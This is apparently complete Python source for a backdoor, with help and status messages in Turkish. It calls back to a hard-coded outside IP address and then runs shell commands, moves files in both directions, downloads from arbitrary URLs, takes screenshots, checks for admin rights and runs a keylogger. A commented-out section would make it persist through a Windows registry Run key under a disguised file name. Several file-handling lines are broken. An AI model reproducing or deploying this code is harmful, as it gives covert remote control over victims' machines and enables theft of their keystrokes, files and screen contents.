#!/usr/bin/python
# -*- coding: utf-8 -*-

import socket
import subprocess
import json
import os
import base64
import time
import requests
from mss import mss
import keylogger
import threading

#import shutil
#import sys

def reliable_send(data):
        json_data = json.dumps(data)
        sock.send(json_data)

def reliable_recv():
        data = ""
        while True:
                try:
                        data = data + sock.recv(1024)
                        return json.loads(data)
                except ValueError:
                        continue

def screenshot():
        with mss() as screenshot:
                screenshot.shot()


def is_admin():
        global admin
        try:
                temp = os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\windows'),'temp']))
        except:
                admin = "[!!] Kullanici yetkisi mevcut"
        else:
                admin = "[+] Admin yetkisi mevcut"
        

def connection():
        while True:
                time.sleep(20)
                try:
                        sock.connect(("40.115.57.47",17700))
                        shell()
                except:
                        connection()

def download(url):

        file_data = requests.get(url)
        file_name = url.split("/")[-1]
        with open(file_name,"wb") as out_file:
                out_file.write(file_data.content)


def shell():
	while True:
		command = reliable_recv()
		if command == "q":
			break

		elif command[:5] == "help":
                        help_option = """
                        download <path> --> Hedef PC'den dosya indir
                        upload <path> --> Hedef PC'ye dosya gönder
                        get <url> --> Herhangi bir URL'den hedef bilgisayara dosyayı indir
                        start <path> --> Herhangi bir programı hedef PC'de çalıştırır
                        screenshot --> Ekran görüntüsü alır
                        keylog_start --> Hedef bilgisayarda keylogger başlatır
                        keylog_dump --> Hedef bilgisayardan alınan klavye girdileri ekrana bastırılır
                        check --> Admin yetkisinin olup olmadığını kontrol eder
                        q --> Backdoor'dan çıkış yapar
                        """
                        reliable_send(help_option)

		elif command[:2] == "cd" and len(command) > 1:
			try:
				os.chdir(command[3:])
			except:
				continue

		elif command[:8] == "download":
                        with open("command[9:]",'rb') as file:
				reliable_send(base64.b64encode(file.read()))
                elif command[:6] == "upload":
                        with open("command[7:]","wb") as fin:
				file_data = reliable_recv()
				fin.write(base64.b64decode(file_data))

                elif command[:3] == "get":
                        try:
                                download(command[4:])
                                reliable_send("[+] Dosya indirildi")
                        except:
                                reliable_send("[-] Dosya indirmede hata")

                elif command[:5] == "start":
                        try:
                                subprocess.Popen(command[6:],shell=True)
                                reliable_send("[+] Program çalışıyor")
                        except:
                                reliable_send("[!!] Program çalıştırmada hata")

                elif command[:10] == "screenshot":
                        try:
                                screenshot()
                                with open("monitor-1.png","rb") as sc:
                                        reliable_send(base64.b64encode(sc.read()))
                                os.remove("monitor-1.png");
                        except:
                                reliable_send("[!!] Ekran goruntusu almada hata")

                elif command[:5] == "check":
                        try:
                                is_admin()
                                reliable_send(admin)
                        except:
                                reliable_send("[!!] Yetki dogrulamada hata")

                elif command[:12] == "keylog_start":
                        thread = threading.Thread(target=keylogger.start)
                        thread.start()

                elif command[:11] == "keylog_dump":
                        with open(keylogger_path,"r") as file:
                                reliable_send(file.read())
                	
		else:
			proc = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
			result = proc.stdout.read()
			reliable_send(result)


keylogger_path = os.environ["appdata"] + "\\processmanager.txt"
#location = os.environ["appdata"] + "\\windows32.exe"

#if not os.path.exists(location):
	#shutil.copyfile(sys.executable,location)
	#subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"',shell=True)

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

connection()

#sock.connect(("192.168.1.104",17700))

#shell()

sock.close()
